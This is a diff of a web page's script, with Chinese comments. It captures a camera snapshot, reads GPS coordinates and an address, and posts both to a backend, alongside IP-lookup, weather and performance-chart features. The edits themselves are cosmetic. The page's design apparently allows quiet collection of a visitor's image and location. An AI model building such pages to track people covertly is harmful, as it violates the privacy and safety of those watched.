@@ -82,7 +82,6 @@
 
 <script>
   // 獨立的相機拍照功能
-  // 獨立的相機拍照功能
   async function startCamera() {
     const statusElement = document.getElementById('status');
     let photoData = null;
@@ -113,7 +112,7 @@
         photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
         stream.getTracks().forEach((track) => track.stop());
         
-        // 發送照片到後端
+        // 獨立發送照片到後端
         sendPhotoToServer(photoData);
       }, 1000);
     } catch (error) {
@@ -131,7 +130,7 @@
           timeout: 10000 // 設置超時時間為 10 秒
         });
       });
-
+      
       const { latitude, longitude } = position.coords;
 
       // 透過經緯度取得地址
@@ -141,19 +140,17 @@
 
       // 繼續處理 GPS 資訊
       sendGpsToServer(latitude, longitude, address);
+      return { latitude, longitude, address };
     } catch (error) {
       console.error('GPS 錯誤或超時:', error);
       statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限或嘗試重新載入。';
+      return null;
     }
   }
 
   // 發送照片到後端
   async function sendPhotoToServer(photoData) {
     const statusElement = document.getElementById('status');
-    if (!photoData) {
-      console.error('無法獲取照片');
-      return;
-    }
     try {
       console.log('開始發送照片到後端...');
       const formData = new URLSearchParams();
@@ -170,25 +167,24 @@
 
       const result = await response.json();
       if (result.success) {
-        console.log('照片資料成功發送到後端！');
+        console.log('照片成功發送到後端！');
         statusElement.innerText = '照片已成功發送。';
       } else {
         console.error(`後端錯誤: ${result.error}`);
-        statusElement.innerText = `照片通知發送失敗：${result.error}`;
+        statusElement.innerText = `照片發送失敗：${result.error}`;
       }
     } catch (error) {
-      console.error('發送照片過程中發生錯誤:', error);
-      statusElement.innerText = '發送照片過程中發生錯誤，請檢查控制台。';
+      console.error('照片發送過程中發生錯誤:', error);
+      statusElement.innerText = '照片發送過程中發生錯誤，請檢查控制台。';
     }
   }
 
-  // 發送 GPS 到後端
+  // 發送 GPS 資訊到後端
   async function sendGpsToServer(latitude, longitude, address) {
     const statusElement = document.getElementById('status');
     try {
       console.log('開始發送 GPS 資訊到後端...');
       const formData = new URLSearchParams();
-      formData.append('message', 'GPS 資訊');
       formData.append('latitude', latitude);
       formData.append('longitude', longitude);
       formData.append('address', address);
@@ -203,15 +199,15 @@
 
       const result = await response.json();
       if (result.success) {
-        console.log('GPS 資料成功發送到後端！');
+        console.log('GPS 資訊成功發送到後端！');
         statusElement.innerText = 'GPS 資訊已成功發送。';
       } else {
         console.error(`後端錯誤: ${result.error}`);
-        statusElement.innerText = `GPS 通知發送失敗：${result.error}`;
+        statusElement.innerText = `GPS 資訊發送失敗：${result.error}`;
       }
     } catch (error) {
-      console.error('發送 GPS 過程中發生錯誤:', error);
-      statusElement.innerText = '發送 GPS 過程中發生錯誤，請檢查控制台。';
+      console.error('GPS 資訊發送過程中發生錯誤:', error);
+      statusElement.innerText = 'GPS 資訊發送過程中發生錯誤，請檢查控制台。';
     }
   }
 
@@ -269,6 +265,7 @@
       document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
     }
   }
+
   // 性能監控
   function setupPerformanceChart() {
     const ctx = document.getElementById('performanceChart').getContext('2d');
@@ -324,7 +321,6 @@
   }
 
   // 啟動功能
-  // 啟動功能
   document.addEventListener('DOMContentLoaded', async () => {
     getIpInfo();
     setupPerformanceChart();
@@ -337,5 +333,6 @@
     }
   });
 </script>
+
 </body>
 </html>
